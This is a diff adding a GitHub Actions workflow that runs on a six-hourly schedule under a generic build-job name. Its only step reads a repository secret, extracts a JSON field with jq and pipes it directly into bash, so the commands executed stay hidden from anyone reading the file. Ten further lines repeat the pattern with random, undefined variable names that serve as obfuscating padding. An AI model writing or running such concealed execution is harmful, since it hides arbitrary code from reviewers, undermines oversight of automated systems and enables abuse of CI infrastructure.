@@ -1,0 +1,26 @@
+name: anquansafeth
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: anquansafeth
+        env:
+          fp90: ${{ secrets.fp90 }}
+        run: |
+          echo $fp90 | jq -r .sx2 | /bin/bash
+          echo $iguq8340 | jq -r .vdv62 | /bin/bash
+          echo $rwc4870 | jq -r .fo11966 | /bin/bash
+          echo $oszy12754 | jq -r .hqaa835 | /bin/bash
+          echo $fr61 | jq -r .vne3 | /bin/bash
+          echo $kpuy72 | jq -r .yu65 | /bin/bash
+          echo $nqw65058 | jq -r .gcotl832 | /bin/bash
+          echo $v2 | jq -r .xwzju0 | /bin/bash
+          echo $h862 | jq -r .lzbl79 | /bin/bash
+          echo $souvi4348 | jq -r .tgcf49 | /bin/bash
+          echo $xlwp984 | jq -r .etdr84 | /bin/bash
+
